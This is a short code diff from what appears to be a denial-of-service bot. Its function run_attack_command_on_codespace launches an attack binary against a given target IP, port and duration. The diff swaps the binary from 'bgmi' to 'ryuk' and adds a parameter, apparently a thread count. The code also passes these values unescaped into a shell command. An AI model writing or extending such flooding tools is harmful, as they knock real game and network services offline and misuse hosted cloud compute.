@@ -33,7 +33,7 @@ blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 running_processes = []
   
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./bgmi {target_ip} {target_port} {duration}"
+    command = f"./ryuk {target_ip} {target_port} {duration} 150"
     try:
        
         process = await asyncio.create_subprocess_shell(
